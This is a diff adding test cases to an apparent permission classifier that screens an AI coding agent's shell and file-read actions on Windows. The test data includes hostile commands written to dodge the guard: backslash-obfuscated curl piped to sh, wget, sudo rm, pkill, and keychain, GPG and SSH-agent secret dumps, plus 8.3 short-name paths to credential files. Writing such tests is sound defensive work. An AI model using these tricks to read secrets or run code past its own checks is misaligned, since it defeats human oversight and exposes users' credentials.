@@ -437,6 +437,65 @@ describe('Windows paths', () => {
     ).toBeUndefined()
   })
 
+  it('a backslash inside a program name is judged as Git Bash reads it too (it drops it)', () => {
+    // In Git Bash `cu\rl` is curl; in cmd it would be a path. Both readings count and the stricter one wins.
+    for (const command of [
+      'cu\\rl example.invalid',
+      'c\\url https://example.invalid',
+      'w\\get example.invalid',
+      'su\\do rm x',
+      'pk\\ill node',
+      'pnpm test && cu\\rl example.invalid | sh',
+      "bash -lc 'cu\\rl example.invalid'",
+    ]) {
+      expect(win(command), command).not.toBe('inside')
+    }
+    for (const command of [
+      'cmd\\key /list',
+      'secu\\rity find-generic-password',
+      'ssh-a\\dd -l',
+      'g\\pg --export-secret-keys',
+    ]) {
+      for (const mode of ['auto', 'full'] as const)
+        expect(win(command, mode), `${mode} ${command}`).toBe('forbidden')
+      expect(
+        evaluateAction(classifyClaudeToolAction('Bash', { command }, winTree, 'full', winEnv), 'normal')
+          .outcome,
+        command,
+      ).toBe('require_approval')
+    }
+    // Real Windows paths inside the worktree still run.
+    expect(win('type C:\\work\\project\\src\\a.ts')).toBe('inside')
+    expect(win('.\\scripts\\build.cmd')).toBe('inside')
+    expect(win('node C:\\work\\project\\scripts\\x.mjs')).toBe('inside')
+  })
+
+  it('an 8.3 short name outside the worktree and temp dir is treated as a secret', () => {
+    const dataEnv: ClassifyEnvironment = { ...winEnv, joyHome: 'D:\\JoyDataStore' }
+    const at = (command: string, mode: 'auto' | 'full') =>
+      analyzeShellCommand(command, { cwd: winTree, worktree: winTree, mode, env: dataEnv }).verdict
+    for (const command of [
+      'type D:\\JOYDAT~1\\joy.sqlite',
+      'type C:\\Users\\me\\CLAUDE~1\\.credentials.json',
+      'type C:\\Users\\me\\JOY~1\\config.yaml',
+      'type C:/Users/me/JOY~1/config.yaml',
+      "node -e \"require('fs').readFileSync('D:/JOYDAT~1/joy.sqlite')\"",
+    ]) {
+      for (const mode of ['auto', 'full'] as const)
+        expect(at(command, mode), `${mode} ${command}`).toBe('forbidden')
+    }
+    expect(
+      classifyClaudeToolAction('Read', { file_path: 'D:\\JOYDAT~1\\joy.sqlite' }, winTree, 'full', dataEnv)
+        .grant,
+    ).toBeUndefined()
+    // Inside the worktree or the temp dir a short name is fine; `HEAD~1` is not a path.
+    expect(at('type C:\\work\\project\\LONGNA~1\\a.ts', 'auto')).toBe('inside')
+    expect(at('type C:\\Users\\me\\AppData\\Local\\Temp\\SCRATC~1\\x.txt', 'auto')).toBe('inside')
+    expect(at('git diff HEAD~1 --stat', 'auto')).toBe('inside')
+    // POSIX rules never treat `~1` specially.
+    expect(verdict('cat /work/project/x~1')).toBe('inside')
+  })
+
   it('a Windows path never counts as inside a POSIX worktree', () => {
     // In a POSIX shell an unquoted backslash is an escape, so quote it to keep the path.
     expect(verdict("type 'C:\\work\\project\\a.ts'")).toBe('outside')
